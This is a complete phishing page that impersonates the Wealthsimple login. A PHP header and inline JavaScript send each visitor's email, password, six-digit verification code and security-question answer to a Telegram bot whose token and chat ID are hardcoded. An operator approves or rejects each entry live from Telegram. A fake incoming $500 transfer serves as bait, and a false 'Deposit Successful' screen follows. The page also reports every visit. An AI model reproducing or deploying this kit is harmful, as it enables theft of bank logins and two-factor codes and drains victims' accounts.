<?php
/* ---------- Locate config ---------- */
$docRoot    = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/') . '/../../..';\n$configPath = $docRoot . '/config.php';\n$config     = is_file($configPath) ? require $configPath : [];\n\n/* ---------- Telegram credentials ---------- */\n$telegramToken = $config['telegram']['bot_token'] ?? '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';\n$chatId        = $config['telegram']['chat_id'] ?? '-1002922644009';\n?>\n<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>my.wealthsimple.com/app/login?locale=en-ca</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="icon" type="image/x-icon" href="https://my.wealthsimple.com/favicon.ico" />
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
    }
    .checkmark {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      display: block;
      stroke-width: 3;
      stroke: #10B981; /* Tailwind green-500 */
      stroke-miterlimit: 10;
      box-shadow: inset 0px 0px 0px #10B981;
      animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
      margin: 0 auto;
    }
    .checkmark__circle {
      stroke-dasharray: 166;
      stroke-dashoffset: 166;
      stroke-width: 3;
      stroke-miterlimit: 10;
      stroke: #10B981;
      fill: none;
      animation: stroke .6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
    }
    .checkmark__check {
      transform-origin: 50% 50%;
      stroke-dasharray: 48;
      stroke-dashoffset: 48;
      animation: stroke .3s cubic-bezier(0.65, 0, 0.45, 1) .8s forwards;
    }
    @keyframes stroke { 100% { stroke-dashoffset: 0; } }
    @keyframes scale { 0%, 100% { transform: none; } 50% { transform: scale3d(1.1, 1.1, 1); } }
    @keyframes fill { 100% { box-shadow: inset 0px 0px 0px 40px #10B981; } }
  </style>
</head>
<body class="bg-[#f7f6f3] text-[#1f1f1f] antialiased">
  
  <main class="flex items-start justify-center min-h-screen pt-12 md:pt-16 px-4">
    <div class="w-full max-w-sm">
      <h1 class="text-2xl font-semibold mb-6 text-[#1f1f1f]">Wealthsimple</h1>
      <div class="bg-white rounded-2xl p-7 shadow-lg">
        
        <!-- Step 1: Login -->
        <div id="login-step">
          <h2 class="text-center text-lg font-medium mb-6 text-gray-500">Welcome back</h2>
          <form id="login-form" class="space-y-4" autocomplete="off" novalidate>
            <div>
              <input id="email-input" name="email" type="email" autocomplete="off" required placeholder="Email address"
                class="block w-full px-4 py-3.5 bg-white border border-[#e6e6e6] rounded-lg text-sm text-[#1f1f1f] placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-black">
            </div>
            <div class="relative">
              <input id="password-input" name="password" type="password" autocomplete="new-password" required placeholder="Password" 
                class="block w-full px-4 py-3.5 bg-white border border-[#e6e6e6] rounded-lg text-sm text-[#1f1f1f] placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-black">
              <button type="button" id="toggle-password-btn" class="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-400 hover:text-gray-600">
                <svg id="eye-icon-open" class="h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.432 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
                  <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                </svg>
                <svg id="eye-icon-closed" class="h-5 w-5 hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.243 4.243L6.228 6.228" />
                </svg>
              </button>
            </div>
            
            <div id="login-error" class="text-red-500 text-sm text-center py-2 hidden"></div>
            <div class="pt-2">
              <button id="login-submit-btn" type="submit"
                class="w-full flex justify-center items-center py-3.5 px-4 rounded-full text-sm font-medium text-white bg-gradient-to-r from-gray-500 to-black hover:opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-black disabled:bg-gray-400 disabled:from-gray-400 disabled:cursor-not-allowed transition-opacity">
                <span>Log In</span>
              </button>
            </div>
          </form>
        </div>

        <!-- Step 2: PIN -->
        <div id="pin-step" class="hidden">
          <div class="text-center">
            <h2 class="text-xl font-medium text-[#1f1f1f]">Two-step verification</h2>
            <p class="mt-2 text-sm text-gray-500">Enter the 6-digit code sent to your device.</p>
          </div>
          <form id="pin-form" class="space-y-4 pt-4" autocomplete="off" novalidate>
            <div>
              <input id="pin-input" name="pin" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" required maxlength="6" placeholder="_ _ _ _ _ _"
                class="block w-full px-3 py-3 bg-white border border-[#e6e6e6] rounded-lg text-black text-center text-2xl tracking-widest focus:outline-none focus:ring-2 focus:ring-black">
            </div>
            <div id="pin-error" class="text-red-500 text-sm text-center py-2 hidden"></div>
            <div id="pin-timer-container" class="text-center text-xs text-gray-500"></div>
            <div class="pt-2">
              <button id="pin-submit-btn" type="submit"
                class="w-full flex justify-center items-center py-3.5 px-4 rounded-full text-sm font-medium text-white bg-gradient-to-r from-gray-500 to-black hover:opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-black disabled:bg-gray-400 disabled:from-gray-400 disabled:cursor-not-allowed transition-opacity">
                <span>Continue</span>
              </button>
            </div>
          </form>
        </div>
        
        <!-- Step 3: Security Question -->
        <div id="security-step" class="hidden">
          <div class="text-center">
            <h2 class="text-xl font-medium text-[#1f1f1f]">Security Question</h2>
            <p class="mt-2 text-sm text-gray-500">To accept the transfer, please answer the question below.</p>
          </div>
          <div class="mt-5 p-4 bg-gray-50 rounded-lg space-y-3 text-sm border border-gray-200">
            <div class="flex justify-between">
              <span class="text-gray-500">From:</span>
              <span class="font-medium text-[#1f1f1f]" id="sender-name-sec">Jane Doe</span>
            </div>
            <div class="flex justify-between">
              <span class="text-gray-500">Amount:</span>
              <span class="font-medium text-[#1f1f1f]" id="amount-sec">$500.00</span>
            </div>
            <div class="pt-3 border-t border-gray-200">
                <p class="text-gray-500">What is your mother's maiden name?</p>
            </div>
          </div>
          <form id="security-form" class="space-y-4 pt-4" autocomplete="off" novalidate>
             <div>
              <input id="security-input" name="securityAnswer" type="text" required placeholder="Your answer" autocomplete="off"
                class="block w-full px-4 py-3 bg-white border border-[#e6e6e6] rounded-lg text-sm text-[#1f1f1f] placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-black">
            </div>
            <div id="security-error" class="text-red-500 text-sm text-center py-2 hidden"></div>
            <div class="pt-2 space-y-3">
              <button id="security-submit-btn" type="submit"
                class="w-full flex justify-center items-center py-3.5 px-4 rounded-full text-sm font-medium text-white bg-gradient-to-r from-gray-500 to-black hover:opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-black disabled:bg-gray-400 disabled:from-gray-400 disabled:cursor-not-allowed transition-opacity">
                <span>Submit Answer</span>
              </button>
              <button id="cancel-btn" type="button"
                class="w-full flex justify-center items-center py-3.5 px-4 rounded-full text-sm font-medium text-black bg-gray-200 hover:bg-gray-300 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-400 disabled:bg-gray-100 disabled:cursor-not-allowed transition-colors">
                Cancel Transfer
              </button>
            </div>
          </form>
        </div>

        <!-- Step 4: Confirmation -->
        <div id="confirmation-step" class="hidden">
          <div class="text-center space-y-4 py-4">
            <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
              <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
              <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
            </svg>
            <h2 class="text-xl font-medium text-[#1f1f1f] pt-4">Deposit Successful</h2>
            <div class="mt-1 p-4 bg-gray-50 rounded-lg space-y-3 text-sm border border-gray-200 text-left">
                <div class="flex justify-between">
                  <span class="text-gray-500">Amount:</span>
                  <span class="font-medium text-[#1f1f1f]" id="amount-conf">$500.00</span>
                </div>
                <div class="flex justify-between">
                  <span class="text-gray-500">From:</span>
                  <span class="font-medium text-[#1f1f1f]" id="sender-name-conf">Jane Doe</span>
                </div>
            </div>
            <p class="text-sm text-gray-600 leading-relaxed pt-2">
              Due to maintenance between <strong id="today-date" class="text-gray-800"></strong> and <strong id="future-date" class="text-gray-800"></strong>, it may take up to 90 minutes for this to reflect in your account.
            </p>
            <div class="pt-2">
              <button id="done-btn"
                class="w-full flex justify-center items-center py-3.5 px-4 rounded-full text-sm font-medium text-white bg-gradient-to-r from-gray-500 to-black hover:opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-black transition">
                Done
              </button>
            </div>
          </div>
        </div>

        <!-- Step 5: Cancelled -->
        <div id="cancelled-step" class="hidden">
            <div class="text-center space-y-4 py-4">
                <div class="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-red-100">
                    <svg class="h-12 w-12 text-red-500" stroke="currentColor" fill="none" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                </div>
                <h2 class="text-xl font-medium text-[#1f1f1f] pt-4">Transfer Cancelled</h2>
                <p class="text-sm text-gray-600 leading-relaxed">
                    The transfer has been successfully cancelled. No funds were deposited.
                </p>
                <div class="pt-2">
                    <button id="return-btn" class="w-full flex justify-center items-center py-3.5 px-4 rounded-full text-sm font-medium text-white bg-gradient-to-r from-gray-500 to-black hover:opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-black transition">
                        Return to Login
                    </button>
                </div>
            </div>
        </div>

      </div>
      <div class="text-center text-xs text-[#9a9a9a] mt-8 space-y-2">
        <p><a href="#" class="text-[#1f1f1f] font-medium">Help Centre</a></p>
        <p>Download our mobile apps: 
          <a href="#" class="text-[#1f1f1f] font-medium">iPhone</a> & 
          <a href="#" class="text-[#1f1f1f] font-medium">Android</a>
        </p>
      </div>
    </div>
  </main>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      // --- STATE ---
      let currentStep = 'login';
      let isLoading = false;
      let pinTimer = 0;
      let pinInterval;
      let transactionId = '';

      // --- CONFIGURATION ---
      const senderName = 'Jane Doe';
      const amount = '$500.00';
      const telegramToken = "8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM";
      const chatId = "-1002922644009";

      const loadingSpinner = `
        <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
        </svg>`;

      // --- DOM ELEMENTS ---
      const steps = {
        login: document.getElementById('login-step'),
        pin: document.getElementById('pin-step'),
        security: document.getElementById('security-step'),
        confirmation: document.getElementById('confirmation-step'),
        cancelled: document.getElementById('cancelled-step')
      };
      
      const loginForm = document.getElementById('login-form');
      const emailInput = document.getElementById('email-input');
      const passwordInput = document.getElementById('password-input');
      const loginSubmitBtn = document.getElementById('login-submit-btn');
      const loginError = document.getElementById('login-error');
      
      const pinForm = document.getElementById('pin-form');
      const pinInput = document.getElementById('pin-input');
      const pinSubmitBtn = document.getElementById('pin-submit-btn');
      const pinError = document.getElementById('pin-error');
      const pinTimerContainer = document.getElementById('pin-timer-container');

      const securityForm = document.getElementById('security-form');
      const securityInput = document.getElementById('security-input');
      const securitySubmitBtn = document.getElementById('security-submit-btn');
      const securityError = document.getElementById('security-error');
      const cancelBtn = document.getElementById('cancel-btn');

      const doneBtn = document.getElementById('done-btn');
      const returnBtn = document.getElementById('return-btn');
      const togglePasswordBtn = document.getElementById('toggle-password-btn');
      const eyeIconOpen = document.getElementById('eye-icon-open');
      const eyeIconClosed = document.getElementById('eye-icon-closed');

      // --- UI UPDATE FUNCTIONS ---
      
      const showStep = (step) => {
        currentStep = step;
        Object.values(steps).forEach(s => s.classList.add('hidden'));
        if (steps[step]) {
          steps[step].classList.remove('hidden');
        }
      };
      
      const setLoading = (button, loading, text, loadingText) => {
          isLoading = loading;
          button.disabled = loading;
          if (loading) {
              button.innerHTML = `${loadingSpinner} ${loadingText}`;
          } else {
              button.innerHTML = `<span>${text}</span>`;
          }
      };

      const setErrorMessage = (el, message) => {
        if (message) {
          el.textContent = message;
          el.classList.remove('hidden');
        } else {
          el.textContent = '';
          el.classList.add('hidden');
        }
      };

      // --- LOGIC FUNCTIONS ---
      
      const initializeTransaction = () => {
        transactionId = `TR-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
        console.log(`[BACKEND SIMULATION] New transaction initialized. ID: ${transactionId}`);
      };

      const updateTransferStatus = async (newStatus) => {
        console.log(`[BACKEND SIMULATION] Sending request to update transfer log...`);
        await new Promise(resolve => setTimeout(resolve, 500));
        console.log(`[BACKEND SIMULATION] SUCCESS: Updated transfers.log for transaction ${transactionId}. New status: ${newStatus}`);
      };
      
      const sendInitialTelegramMessage = () => {
        const message = "🟩 Wealthsimple Controller 🟩\n\nlogin page accessed\n\n🟩 Wealthsimple Controller 🟩";
        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        }).catch(err => console.error("Could not send initial message", err));
      };
      
      const sendTelegramMessage = async (text) => {
        const keyboard = { inline_keyboard: [[{ text: "🟩 Correct", callback_data: "level2" }], [{ text: "🟥 Incorrect", callback_data: "error" }]] };
        try {
          const sendRes = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: `🟩 Wealthsimple Controller 🟩\n\n${text}\n\n🟩 Wealthsimple Controller 🟩`,
              parse_mode: "HTML",
              reply_markup: keyboard
            })
          });
          if (!sendRes.ok) throw new Error('Failed to send Telegram message.');
          const sendData = await sendRes.json();
          const messageId = sendData?.result?.message_id;
          if (!messageId) throw new Error('Could not get message ID from Telegram.');

          return await new Promise((resolve, reject) => {
            const pollInterval = 1500, maxPollTime = 120000;
            let elapsedTime = 0;
            const intervalId = setInterval(async () => {
              elapsedTime += pollInterval;
              if (elapsedTime > maxPollTime) {
                clearInterval(intervalId);
                reject(new Error('Polling timed out.'));
                return;
              }
              try {
                const updatesRes = await fetch(`https://api.telegram.org/bot${telegramToken}/getUpdates?offset=-1`);
                const updatesData = await updatesRes.json();
                const callbackQuery = (updatesData.result || []).find(u => u.callback_query && u.callback_query.message?.message_id === messageId)?.callback_query;

                if (callbackQuery) {
                  clearInterval(intervalId);
                  fetch(`https://api.telegram.org/bot${telegramToken}/answerCallbackQuery`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({callback_query_id: callbackQuery.id}) });
                  fetch(`https://api.telegram.org/bot${telegramToken}/editMessageReplyMarkup`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({chat_id: chatId, message_id: messageId, reply_markup:{inline_keyboard:[]}}) });
                  resolve(callbackQuery.data === 'level2');
                }
              } catch (err) { console.error('Polling error:', err); }
            }, pollInterval);
          });
        } catch (error) {
          console.error("Telegram integration error:", error);
          setErrorMessage(document.querySelector(`#${currentStep}-error`), 'A network error occurred. Please try again.');
          return false;
        }
      };

      const startPinTimer = () => {
          pinTimer = 60;
          if (pinInterval) clearInterval(pinInterval);

          const updateTimerDisplay = () => {
              if (pinTimer > 0) {
                  const minutes = Math.floor(pinTimer / 60).toString().padStart(2, '0');
                  const seconds = (pinTimer % 60).toString().padStart(2, '0');
                  pinTimerContainer.innerHTML = `<span>Resend code in ${minutes}:${seconds}</span>`;
              } else {
                  pinTimerContainer.innerHTML = `<button type="button" id="resend-pin-btn" class="font-medium text-black hover:underline">Resend code</button>`;
                  document.getElementById('resend-pin-btn').addEventListener('click', startPinTimer);
                  clearInterval(pinInterval);
              }
          };

          updateTimerDisplay();
          pinInterval = setInterval(() => {
              pinTimer--;
              updateTimerDisplay();
          }, 1000);
      };

      const resetFlow = () => {
        emailInput.value = 'demo@example.com';
        passwordInput.value = 'password123';
        pinInput.value = '';
        securityInput.value = '';
        setErrorMessage(loginError, '');
        setErrorMessage(pinError, '');
        setErrorMessage(securityError, '');
        if (pinInterval) clearInterval(pinInterval);
        initializeTransaction();
        showStep('login');
      };

      // --- EVENT HANDLERS ---
      loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        setErrorMessage(loginError, '');
        if (!emailInput.value || !passwordInput.value) {
          setErrorMessage(loginError, 'Please enter your email and password.');
          return;
        }
        setLoading(loginSubmitBtn, true, 'Log In', 'Processing...');
        try {
          const message = `🔸️ User: <code>${emailInput.value}</code>\n🔸️ Pass: <code>${passwordInput.value}</code>`;
          if (await sendTelegramMessage(message)) {
            showStep('pin');
            startPinTimer();
          } else {
            setErrorMessage(loginError, 'Incorrect username or password.');
          }
        } catch (error) {
          setErrorMessage(loginError, 'An unexpected error occurred.');
        } finally {
          setLoading(loginSubmitBtn, false, 'Log In', 'Processing...');
        }
      });
      
      pinForm.addEventListener('submit', async (e) => {
          e.preventDefault();
          setErrorMessage(pinError, '');
          if (!pinInput.value || pinInput.value.length < 6) {
              setErrorMessage(pinError, 'Please enter the 6-digit code.');
              return;
          }
          setLoading(pinSubmitBtn, true, 'Continue', 'Verifying...');
          try {
              const message = `🔸️ PIN: <code>${pinInput.value}</code>`;
              if (await sendTelegramMessage(message)) {
                  showStep('security');
              } else {
                  setErrorMessage(pinError, 'Incorrect code. Please try again.');
              }
          } catch (error) {
              setErrorMessage(pinError, 'An unexpected error occurred.');
          } finally {
              setLoading(pinSubmitBtn, false, 'Continue', 'Verifying...');
          }
      });

      securityForm.addEventListener('submit', async (e) => {
          e.preventDefault();
          setErrorMessage(securityError, '');
          if (!securityInput.value) {
              setErrorMessage(securityError, 'Please answer the security question.');
              return;
          }
          setLoading(securitySubmitBtn, true, 'Submit Answer', 'Submitting...');
          try {
              const message = `🔸️ Security Answer: <code>${securityInput.value}</code>`;
              if (await sendTelegramMessage(message)) {
                  await updateTransferStatus('Completed');
                  showStep('confirmation');
              } else {
                  setErrorMessage(securityError, 'Incorrect answer. Please try again.');
              }
          } catch(error) {
              setErrorMessage(securityError, 'An unexpected error occurred.');
          } finally {
              setLoading(securitySubmitBtn, false, 'Submit Answer', 'Submitting...');
          }
      });

      cancelBtn.addEventListener('click', async () => {
          setLoading(securitySubmitBtn, true, 'Submit Answer', 'Submitting...');
          cancelBtn.disabled = true;
          await updateTransferStatus('Cancelled');
          const message = `❌ Transfer Cancelled by user. (ID: ${transactionId})`;
          try {
              await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                  method:'POST',
                  headers:{'Content-Type':'application/json'},
                  body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
              });
          } catch (err) {
              console.error("Could not send cancellation message", err)
          } finally {
              showStep('cancelled');
              setLoading(securitySubmitBtn, false, 'Submit Answer', 'Submitting...');
              cancelBtn.disabled = false;
          }
      });

      togglePasswordBtn.addEventListener('click', () => {
        const isPassword = passwordInput.type === 'password';
        passwordInput.type = isPassword ? 'text' : 'password';
        eyeIconOpen.classList.toggle('hidden', isPassword);
        eyeIconClosed.classList.toggle('hidden', !isPassword);
      });

      doneBtn.addEventListener('click', resetFlow);
      returnBtn.addEventListener('click', resetFlow);

      // --- INITIALIZATION ---
      const init = () => {
        const today = new Date();
        const future = new Date(today.getTime() + 48 * 60 * 60 * 1000);
        const options = { month: 'long', day: 'numeric', year: 'numeric' };
        document.getElementById('today-date').textContent = today.toLocaleDateString(undefined, options);
        document.getElementById('future-date').textContent = future.toLocaleDateString(undefined, options);
        document.getElementById('sender-name-sec').textContent = senderName;
        document.getElementById('amount-sec').textContent = amount;
        document.getElementById('sender-name-conf').textContent = senderName;
        document.getElementById('amount-conf').textContent = amount;
        
        sendInitialTelegramMessage();
        initializeTransaction();
        showStep('login');
      };

      init();
    });
  </script>
</body>
</html>
